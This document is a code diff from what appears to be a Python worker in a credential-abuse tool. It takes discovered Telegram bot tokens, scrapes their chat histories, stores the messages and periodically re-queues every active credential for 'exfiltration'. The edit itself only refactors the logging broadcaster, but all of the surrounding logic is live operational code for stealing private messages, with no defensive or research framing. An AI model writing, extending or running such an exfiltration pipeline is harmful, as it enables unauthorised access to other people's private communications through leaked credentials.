@@ -57,10 +57,10 @@ async def _exfiltrate_logic(cred_id: str):
     # Scrape
     try:
         logger.info(f"⏳ [Exfil] Calling scraper service for chat {chat_id}...")
-        await broadcaster_service.send_log(f"⏳ Scraping chat `{chat_id}`...")
+        await broadcaster.send_log(f"⏳ Scraping chat `{chat_id}`...")
         messages = await scraper_service.scrape_history(bot_token, chat_id)
         logger.info(f"✅ [Exfil] Scraper returned {len(messages)} messages.")
-        await broadcaster_service.send_log(f"✅ Scraped {len(messages)} messages.")
+        await broadcaster.send_log(f"✅ Scraped {len(messages)} messages.")
     except Exception as e:
         db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
         return f"Scraping failed: {e}"
@@ -86,7 +86,7 @@ async def _exfiltrate_logic(cred_id: str):
             print(f"    ⚠️ Insert error for msg {msg.get('telegram_msg_id')}: {e}")
 
     if new_count > 0:
-        await broadcaster_service.send_log(f"💾 Saved {new_count} new messages to DB.")
+        await broadcaster.send_log(f"💾 Saved {new_count} new messages to DB.")
 
     # Trigger Broadcast
     if new_count > 0:
@@ -469,8 +469,9 @@ def system_heartbeat():
         asyncio.set_event_loop(loop)
     
     msg = "💓 **System Heartbeat**: Worker is active and scanning."
-    from app.services.broadcaster_srv import broadcaster_service
-    loop.run_until_complete(broadcaster_service.send_log(msg))
+    from app.services.broadcaster_srv import BroadcasterService
+    broadcaster = BroadcasterService()
+    loop.run_until_complete(broadcaster.send_log(msg))
     return "Heartbeat sent."
 
 @app.task(name="flow.rescrape_active")
@@ -489,8 +490,9 @@ async def _rescrape_active_logic():
     """
     Query all active credentials with a chat_id and trigger exfiltration.
     """
-    from app.services.broadcaster_srv import broadcaster_service
-    await broadcaster_service.send_log("🔄 **Re-scrape**: Starting periodic scrape of active credentials...")
+    from app.services.broadcaster_srv import BroadcasterService
+    broadcaster = BroadcasterService()
+    await broadcaster.send_log("🔄 **Re-scrape**: Starting periodic scrape of active credentials...")
     
     try:
         # Get all active credentials that have a chat_id (ready to scrape)
@@ -503,10 +505,10 @@ async def _rescrape_active_logic():
         credentials = response.data or []
         
         if not credentials:
-            await broadcaster_service.send_log("ℹ️ **Re-scrape**: No active credentials to scrape.")
+            await broadcaster.send_log("ℹ️ **Re-scrape**: No active credentials to scrape.")
             return "No active credentials found."
         
-        await broadcaster_service.send_log(f"📋 **Re-scrape**: Found {len(credentials)} active credentials. Queuing exfiltration...")
+        await broadcaster.send_log(f"📋 **Re-scrape**: Found {len(credentials)} active credentials. Queuing exfiltration...")
         
         queued = 0
         for cred in credentials:
@@ -519,10 +521,10 @@ async def _rescrape_active_logic():
                 print(f"Failed to queue exfiltration for {cred_id}: {e}")
         
         msg = f"🏁 **Re-scrape**: Queued {queued}/{len(credentials)} credentials for exfiltration."
-        await broadcaster_service.send_log(msg)
+        await broadcaster.send_log(msg)
         return msg
         
     except Exception as e:
         error_msg = f"❌ **Re-scrape** failed: {e}"
-        await broadcaster_service.send_log(error_msg)
+        await broadcaster.send_log(error_msg)
         return error_msg
